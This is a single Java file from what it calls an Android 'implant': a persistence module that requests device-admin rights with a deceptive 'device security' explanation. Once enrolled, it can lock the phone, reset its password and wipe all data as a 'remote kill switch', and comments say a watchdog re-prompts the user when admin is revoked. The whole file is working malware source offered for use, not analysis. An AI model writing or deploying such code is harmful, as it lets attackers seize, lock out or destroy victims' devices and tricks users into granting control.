// ============================================================
// FILE 11: persist/DeviceAdminHook.java
// ============================================================
package io.hackerai.implant.persist;

import android.app.Activity;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import android.widget.Toast;

/**
 * DeviceAdminHook — Device Policy Manager enrollment.
 *
 * Capabilities:
 *   - Enroll as device admin (prevent uninstall without deactivation)
 *   - Lock device immediately (lockNow)
 *   - Reset / set device password (resetPassword)
 *   - Wipe device (wipeData) — remote kill switch
 *   - Disable camera, set policies
 *
 * Declared in manifest:
 *   <receiver
 *     android:name=".persist.DeviceAdminHook$AdminReceiver"
 *     android:permission="android.permission.BIND_DEVICE_ADMIN"
 *     android:exported="true">
 *     <meta-data
 *       android:name="android.app.device_admin"
 *       android:resource="@xml/device_admin_policies" />
 *     <intent-filter>
 *       <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
 *     </intent-filter>
 *   </receiver>
 *
 * With @xml/device_admin_policies:
 *   <?xml version="1.0" encoding="utf-8"?>
 *   <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
 *     <uses-policies>
 *       <force-lock />
 *       <reset-password />
 *       <wipe-data />
 *       <disable-camera />
 *       <limit-password />
 *       <watch-login />
 *     </uses-policies>
 *   </device-admin>
 */
public class DeviceAdminHook {
    private static final String TAG = "DeviceAdminHook";
    private static final String ACTION_DEVICE_ADMIN_SETTINGS =
            "android.settings.ACTION_DEVICE_ADMIN_SETTINGS";

    private final Context ctx;
    private final DevicePolicyManager dpm;
    private final ComponentName adminComponent;
    private boolean active = false;

    public DeviceAdminHook(Context context) {
        this.ctx = context.getApplicationContext();
        this.dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        this.adminComponent = new ComponentName(ctx, AdminReceiver.class);
    }

    /** Check if this app is already an active device admin */
    public boolean isActiveAdmin() {
        if (dpm == null) return false;
        active = dpm.isAdminActive(adminComponent);
        return active;
    }

    /** Prompt user to activate device admin (if not already active) */
    public void ensureActive() {
        if (isActiveAdmin()) {
            Log.d(TAG, "Already device admin.");
            return;
        }
        Log.i(TAG, "Requesting device admin activation.");
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Required for device security features.");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(intent);
    }

    /** Lock the device immediately */
    public void lockNow() {
        if (!isActiveAdmin()) {
            Log.w(TAG, "Cannot lock — not device admin.");
            return;
        }
        if (dpm != null) {
            dpm.lockNow();
            Log.i(TAG, "Device locked.");
        }
    }

    /** Reset device password */
    public boolean resetPassword(String newPassword) {
        if (!isActiveAdmin()) {
            Log.w(TAG, "Cannot reset password — not device admin.");
            return false;
        }
        if (dpm != null) {
            boolean success = dpm.resetPassword(newPassword, 0);
            Log.i(TAG, "Password reset: " + success);
            return success;
        }
        return false;
    }

    /** Wipe all device data (factory reset) — use with extreme caution */
    public boolean wipeDevice() {
        if (!isActiveAdmin()) {
            Log.w(TAG, "Cannot wipe — not device admin.");
            return false;
        }
        if (dpm != null) {
            try {
                dpm.wipeData(0);
                Log.i(TAG, "Device wipe initiated.");
                return true;
            } catch (SecurityException e) {
                Log.e(TAG, "Wipe failed: " + e.getMessage());
            }
        }
        return false;
    }

    /** Remove this app as device admin */
    public void removeAdmin() {
        if (dpm != null && isActiveAdmin()) {
            dpm.removeActiveAdmin(adminComponent);
            active = false;
            Log.i(TAG, "Device admin removed.");
        }
    }

    // ----------------------------------------------------------
    // DeviceAdminReceiver — receives policy updates
    // ----------------------------------------------------------
    public static class AdminReceiver extends DeviceAdminReceiver {
        @Override
        public void onEnabled(Context context, Intent intent) {
            Log.i(TAG, "Device admin ENABLED.");
            Toast.makeText(context, "Device admin enabled", Toast.LENGTH_SHORT).show();
        }

        @Override
        public void onDisabled(Context context, Intent intent) {
            Log.w(TAG, "Device admin DISABLED.");
            // PersistenceMatrix watchdog will re-prompt via ensureActive()
        }

        @Override
        public void onPasswordChanged(Context context, Intent intent) {
            Log.d(TAG, "Device password changed.");
        }

        @Override
        public void onLockTaskModeEntering(Context context, Intent intent, String pkg) {
            Log.d(TAG, "Lock task mode entered: " + pkg);
        }

        @Override
        public void onLockTaskModeExiting(Context context, Intent intent) {
            Log.d(TAG, "Lock task mode exited.");
        }
    }
}
